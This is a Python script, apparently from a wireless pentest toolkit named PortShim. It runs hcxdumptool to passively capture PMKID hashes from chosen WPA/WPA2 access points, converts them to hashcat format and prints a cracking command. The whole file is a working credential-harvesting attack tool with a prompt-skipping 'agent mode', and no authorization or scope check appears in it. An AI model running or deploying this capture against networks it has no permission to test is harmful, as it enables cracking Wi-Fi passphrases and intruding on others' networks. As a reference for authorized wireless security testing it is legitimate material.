#!/usr/bin/env python3
"""
PortShim Wireless — passive PMKID capture via hcxdumptool.

Captures PMKID hashes from WPA/WPA2 access points without disconnecting clients.
Works even when PMF (802.11w) blocks deauth or WPA3 Transition Mode leaves no
WPA2 clients to deauthenticate.

Usage:
    python scripts/wireless_pmkid.py                                   # Latest targets
    python scripts/wireless_pmkid.py --targets-file targets.json       # Specific targets
    python scripts/wireless_pmkid.py --duration 30                     # 30s capture
    python scripts/wireless_pmkid.py --interface wlan1                 # Specific iface
    python scripts/wireless_pmkid.py --dry-run                         # Plan only
    python scripts/wireless_pmkid.py --force                           # Override prompts

Output:
    outputs/wireless/pmkid-capture-{timestamp}.pcapng      (raw capture)
    outputs/wireless/pmkid-hashes-{timestamp}.hc22000      (hashcat format)
    outputs/wireless/pmkid-result-{timestamp}.json          (structured metadata)
"""

import argparse
import json
import os
import shutil
import signal
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

# Add project root for imports when run directly
PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from scripts.wireless_hardware import (
    require_external_adapter,
    get_external_adapters,
    get_all_interfaces_info,
)

OUTPUT_DIR = PROJECT_ROOT / "outputs" / "wireless"

# ── Colours ──
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"


def status(msg, ok=True):
    symbol = f"{GREEN}\u2713{RESET}" if ok else f"{RED}\u2717{RESET}"
    print(f"  {symbol} {msg}")


def warn(msg):
    print(f"  {YELLOW}\u26a0 {msg}{RESET}")


def header(msg):
    box = "\u2550"
    pad = max(0, 54 - len(msg))
    print(f"\n{BOLD}{CYAN}\u2550\u2550\u2550 {msg} {RESET}{box * pad}")


def info(msg):
    print(f"   {DIM}{msg}{RESET}")


# ── Tool checks ──


def check_tools_available() -> bool:
    """Return True if both hcxdumptool and hcxpcapngtool are on PATH."""
    return (
        shutil.which("hcxdumptool") is not None
        and shutil.which("hcxpcapngtool") is not None
    )


# ── Target file discovery ──


def find_latest_targets() -> Path | None:
    """Find the most recent targets-*.json file in the wireless output dir."""
    if not OUTPUT_DIR.exists():
        return None
    files = sorted(OUTPUT_DIR.glob("targets-*.json"), reverse=True)
    return files[0] if files else None


def load_targets(file_path: Path) -> list[dict]:
    """Load and validate a targets file. Exits on missing/empty targets."""
    try:
        data = json.loads(file_path.read_text())
    except (json.JSONDecodeError, OSError) as e:
        print(f"{RED}Error reading targets file: {e}{RESET}", file=sys.stderr)
        sys.exit(1)

    targets = data.get("targets")
    if targets is None:
        print(f"{RED}Targets file is missing 'targets' key{RESET}", file=sys.stderr)
        sys.exit(1)

    if not targets:
        print(f"{RED}Targets list is empty — nothing to capture{RESET}", file=sys.stderr)
        sys.exit(1)

    return targets


# ── Channel argument builder ──


def _channel_band(channel: int) -> str:
    """Return band suffix for hcxdumptool: a=2.4GHz, b=5GHz, c=6GHz."""
    if channel <= 14:
        return "a"
    elif channel <= 165:
        return "b"
    else:
        return "c"


def build_channel_args(channels: list[int]) -> str:
    """Build hcxdumptool -c argument from channel list.

    Appends band suffix per hcxdumptool convention:
    a=2.4GHz, b=5GHz, c=6GHz. Channels are deduplicated and sorted.
    """
    unique_channels = sorted(set(channels))
    parts = []
    for ch in unique_channels:
        band = _channel_band(ch)
        parts.append(f"{ch}{band}")
    return ",".join(parts)


# ── Capture ──


def run_pmkid_capture(
    iface: str,
    channel_arg: str,
    output_prefix: str,
    duration: int = 30,
) -> Path | None:
    """Run hcxdumptool for PMKID capture.

    Returns Path to the .pcapng output file, or None on failure.
    """
    output_path = Path(f"{output_prefix}.pcapng")
    # Use process group for clean kill on timeout
    cmd = ["timeout", "--kill-after=5", str(duration),
           "hcxdumptool", "-i", iface, "-c", channel_arg, "-w", str(output_path)]

    info(f"Running: {' '.join(cmd)}")

    try:
        subprocess.run(cmd, check=False, timeout=duration + 10)
    except subprocess.TimeoutExpired:
        warn("hcxdumptool timed out")
        return None

    if output_path.exists():
        return output_path
    return None


def convert_pmkid_to_hashcat(
    pcapng_path: str,
    output_dir: Path,
    ts: str | None = None,
) -> Path | None:
    """Convert a pcapng file to hashcat .hc22000 format via hcxpcapngtool.

    If ts is provided, output filenames use that timestamp for correlation
    with the capture file. Otherwise generates a new timestamp.
    Returns Path to the .hc22000 file, or None on failure.
    """
    if ts is None:
        ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    hc_path = output_dir / f"pmkid-hashes-{ts}.hc22000"
    essid_list = output_dir / f"pmkid-essids-{ts}.txt"

    cmd = [
        "hcxpcapngtool",
        "-o", str(hc_path),
        "-E", str(essid_list),
        pcapng_path,
    ]

    info(f"Converting: {' '.join(cmd)}")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
    except FileNotFoundError:
        print(f"{RED}hcxpcapngtool not found — is hcxtools installed?{RESET}", file=sys.stderr)
        return None

    if result.returncode != 0:
        warn(f"hcxpcapngtool exited with code {result.returncode}")
        if result.stderr:
            info(f"  {result.stderr.strip()[:200]}")
        return None

    if not hc_path.exists() or hc_path.stat().st_size == 0:
        warn("hcxpcapngtool produced empty output — no PMKID hashes found")
        return None

    return hc_path


# ── Orchestration ──


def pmkid_capture_targets(
    iface: str,
    targets: list[dict],
    duration: int = 30,
) -> dict:
    """Run PMKID capture across targets, grouped by channel.

    Returns aggregate result dict matching capture-result schema.
    """
    # Group channels from targets
    channels = sorted(set(
        t.get("channel") for t in targets if t.get("channel") is not None
    ))
    channel_arg = build_channel_args(channels)
    bssids = [t.get("bssid") for t in targets if t.get("bssid")]

    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    output_prefix = str(OUTPUT_DIR / f"pmkid-capture-{ts}")
    output_pcapng = str(OUTPUT_DIR / f"pmkid-capture-{ts}.pcapng")

    info(f"Capturing PMKIDs from {len(targets)} target(s) on {len(channels)} channel(s)")
    info(f"Channels: {channel_arg}")

    # Run hcxdumptool (must be run as root; capture script user will sudo)
    pcapng_result = run_pmkid_capture(
        iface=iface,
        channel_arg=channel_arg,
        output_prefix=output_prefix,
        duration=duration,
    )

    if not pcapng_result:
        return {
            "success": False,
            "error": "hcxdumptool produced no output file",
            "targets": len(targets),
            "channels": channel_arg,
        }

    # Move output to proper location
    final_path = Path(output_pcapng)
    shutil.move(str(pcapng_result), str(final_path))

    # Convert to hashcat format (use same ts for filename correlation)
    hc_path = convert_pmkid_to_hashcat(str(final_path), OUTPUT_DIR, ts=ts)

    return {
        "success": True,
        "pmkid_capture_file": str(final_path),
        "hashcat_file": str(hc_path) if hc_path else None,
        "targets": len(targets),
        "channels": channel_arg,
        "bssids": bssids,
        "duration": duration,
        "timestamp": ts,
    }


# ── CLI ──


def build_parser() -> argparse.ArgumentParser:
    """Build argument parser for PMKID capture."""
    parser = argparse.ArgumentParser(
        description="PortShim Wireless — passive PMKID capture via hcxdumptool",
    )
    parser.add_argument(
        "--targets-file", type=Path,
        help="Path to targets JSON file (default: latest in outputs/wireless/)",
    )
    parser.add_argument(
        "--interface", type=str,
        help="Wireless interface to use (default: best external adapter)",
    )
    parser.add_argument(
        "--duration", type=int, default=60,
        help="Capture duration in seconds (default: 60)",
    )
    parser.add_argument(
        "--dry-run", action="store_true",
        help="Show plan without executing capture",
    )
    parser.add_argument(
        "--force", action="store_true",
        help="Skip interactive prompts (agent mode)",
    )
    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    # ── Tool check ──
    if not check_tools_available():
        print(f"{RED}PMKID tools not available.{RESET}", file=sys.stderr)
        print("  Required: hcxdumptool + hcxpcapngtool (pacman -S hcxdumptool hcxtools)", file=sys.stderr)
        sys.exit(1)

    # ── Load targets ──
    targets_file = args.targets_file or find_latest_targets()
    if targets_file is None:
        print(f"{RED}No targets file found. Run 'portshim wireless select' first.{RESET}", file=sys.stderr)
        sys.exit(1)

    targets = load_targets(targets_file)
    info(f"Loaded {len(targets)} target(s) from {targets_file.name}")

    # ── Interface selection ──
    if args.interface:
        iface = args.interface
    else:
        best = require_external_adapter()
        iface = best["name"]

    # ── Channel argument ──
    channels = sorted(set(
        t.get("channel") for t in targets if t.get("channel") is not None
    ))
    channel_arg = build_channel_args(channels)

    # ── Dry run ──
    if args.dry_run:
        print(f"\n{BOLD}{CYAN}═══ PMKID Capture Plan ═══{RESET}")
        print(f"  Interface:  {iface}")
        print(f"  Targets:    {len(targets)}")
        print(f"  Channels:   {channel_arg}")
        print(f"  Duration:   {args.duration}s")
        print(f"  Output:     {OUTPUT_DIR}/pmkid-capture-<ts>.pcapng")
        print(f"  Hashcat:    {OUTPUT_DIR}/pmkid-hashes-<ts>.hc22000")
        print()
        return 0

    # ── Run capture ──
    header("PMKID Capture")
    result = pmkid_capture_targets(
        iface=iface,
        targets=targets,
        duration=args.duration,
    )

    # ── Save result JSON ──
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    result_path = OUTPUT_DIR / f"pmkid-result-{ts}.json"
    result_path.write_text(json.dumps(result, indent=2))

    # ── Report ──
    print(f"\n{BOLD}{CYAN}═══ PMKID Capture Complete ═══{RESET}")
    if result["success"]:
        status("PMKID capture file saved", True)
        info(f"  {result['pmkid_capture_file']}")
        if result["hashcat_file"]:
            status("Hashcat format converted", True)
            info(f"  {result['hashcat_file']}")
            info(f"  Crack with: hashcat -m 22000 {result['hashcat_file']} <wordlist>")
        else:
            warn("No PMKID hashes extracted — AP may not support PMKID response")
    else:
        status(result.get("error", "Capture failed"), False)

    info(f"Result saved: {result_path}")
    print()
    return 0 if result["success"] else 1


if __name__ == "__main__":
    sys.exit(main())
